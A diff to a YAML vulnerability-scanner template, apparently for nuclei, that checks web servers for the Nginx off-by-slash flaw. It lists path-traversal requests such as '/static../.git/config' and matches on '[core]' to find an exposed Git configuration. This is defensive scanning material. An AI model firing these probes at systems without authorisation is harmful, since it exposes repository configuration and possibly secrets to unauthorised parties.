@@ -1,21 +1,28 @@
 id: git-config-nginxoffbyslash
+info:
+  name: Nginx off-by-slash exposes Git config
+  author: organiccrap
+  severity: medium
+  description: Nginx off-by-slash vulnerability exposes Git configuration.
 
-name: Nginx off-by-slash exposes Git config
-severity: medium
-  
+  # https://twitter.com/Random_Robbie/status/1262676628167110656
+
 requests:
   - method: GET
-    paths:
-      - 'HOSTNAME/static../.git/config'
-      - 'HOSTNAME/js../.git/config'
-      - 'HOSTNAME/images../.git/config'
-      - 'HOSTNAME/img../.git/config'
-      - 'HOSTNAME/css../.git/config'
-      - 'HOSTNAME/assets../.git/config'
-      - 'HOSTNAME/content../.git/config'
-      - 'HOSTNAME/events../.git/config'
-      - 'HOSTNAME/media../.git/config'
-      - 'HOSTNAME/lib../.git/config'
-
-    patterns:
-      - '\[core\]'
+    path:
+      - '{{BaseURL}}/static../.git/config'
+      - '{{BaseURL}}/js../.git/config'
+      - '{{BaseURL}}/images../.git/config'
+      - '{{BaseURL}}/img../.git/config'
+      - '{{BaseURL}}/css../.git/config'
+      - '{{BaseURL}}/assets../.git/config'
+      - '{{BaseURL}}/content../.git/config'
+      - '{{BaseURL}}/events../.git/config'
+      - '{{BaseURL}}/media../.git/config'
+      - '{{BaseURL}}/lib../.git/config'
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    matchers:
+      - type: word
+        words:
+          - '[core]'
